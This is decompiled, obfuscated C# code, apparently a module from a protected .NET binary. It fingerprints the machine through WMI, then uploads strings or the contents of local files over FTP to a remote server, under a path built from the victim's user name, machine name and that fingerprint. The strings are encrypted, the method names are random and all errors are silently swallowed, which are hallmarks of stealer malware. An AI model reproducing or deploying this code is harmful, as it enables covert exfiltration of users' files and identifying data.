using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace MeMbmuKeumkr;

internal sealed class qqlkuWYmPSoPQ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string hVsrsyXwTDBTZtlT()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107368814));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107368825)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107368776);
		ManagementObject val3 = new ManagementObject(getString_0(107368803) + text2 + getString_0(107368762));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107368725)).ToString();
		return text3 + text;
	}

	public static void sxheDUpjlnHVrdb(string vdIyIVthom = "URL", string yfturyCtimHyqLF = "USERNAME", string NYPOrbUAFF = "ACCESO", string MNSMStKgZBufdw = "")
	{
		try
		{
			string text = hVsrsyXwTDBTZtlT();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(vdIyIVthom + getString_0(107368732) + Environment.UserName + getString_0(107368687) + Environment.MachineName + getString_0(107368698) + text + getString_0(107368661));
			ftpWebRequest.Method = getString_0(107368652);
			ftpWebRequest.Credentials = new NetworkCredential(yfturyCtimHyqLF, NYPOrbUAFF);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(MNSMStKgZBufdw);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void tqyneTkUYAZGER(string ezEGBoObHyBAXpa = "URL", string cqDMPhrYrbaLceD = "USERNAME", string ZYLKuqHMHTnSB = "ACCESO", string TpeLpGRTBe = "")
	{
		try
		{
			string text = hVsrsyXwTDBTZtlT();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(ezEGBoObHyBAXpa + getString_0(107368732) + Environment.UserName + getString_0(107368687) + Environment.MachineName + getString_0(107368698) + text + getString_0(107368661));
			ftpWebRequest.Method = getString_0(107368652);
			ftpWebRequest.Credentials = new NetworkCredential(cqDMPhrYrbaLceD, ZYLKuqHMHTnSB);
			byte[] bytes;
			using (StreamReader streamReader = new StreamReader(TpeLpGRTBe))
			{
				bytes = Encoding.UTF8.GetBytes(streamReader.ReadToEnd());
			}
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	static qqlkuWYmPSoPQ()
	{
		Strings.CreateGetStringDelegate(typeof(qqlkuWYmPSoPQ));
	}
}
